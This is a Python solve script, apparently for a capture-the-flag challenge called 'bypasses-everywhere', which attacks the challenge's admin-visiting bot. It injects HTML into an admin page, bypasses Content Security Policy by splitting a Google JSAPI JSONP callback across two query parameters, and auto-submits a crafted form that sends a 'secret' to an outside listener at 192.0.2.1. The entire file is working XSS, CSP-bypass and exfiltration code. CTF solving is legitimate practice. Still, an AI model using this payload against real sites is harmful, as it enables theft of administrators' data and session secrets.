import requests
import os
import time

if os.getenv("DEV") == "1":
    url = "http://localhost:5000/"
    port = ":5000"
else:
    url = "https://bypasses-everywhere.ctf.insecurity-insa.fr/"
    port = ":8080"

remote = "http://192.0.2.1:4568/"
auth = ("insecurity", "fake_preprod_password")

google_csp_bypass = "//www.google.com/jsapi?callback=document.forms[0].submit"
bypass1 = google_csp_bypass[:4]
bypass2 = google_csp_bypass[4:]

def submit_url(target_url):
    res = requests.post(url + "url", data={
        "url": target_url,
    }, auth=auth)
    assert res.status_code == 200 and res.text == "Thanks, I'll check out this article in a bit :)"


target_url = f"http://127.0.0.1{port}/admin?picture=\"><img src='" + remote + "2?p="
submit_url(target_url)
inputs = '<input name=\'{"secret":"No one will never ever access this beauty","url":"'+remote+'","a":"\' value=\'"}\'>'
form = f"<form method=post enctype=text/plain>{inputs}</form>"
print("form", form)
# article?time=<script%20src=https://w&unit=ww.google.com/jsapi?callback=alert></script>
target_url = f"http://127.0.0.1{port}/article?time={form}<script src={bypass1}&unit={bypass2}></script>"
print("target_url", target_url)

submit_url(target_url)
time.sleep(2)
r = requests.get(remote)
assert r.json()["up"] == True
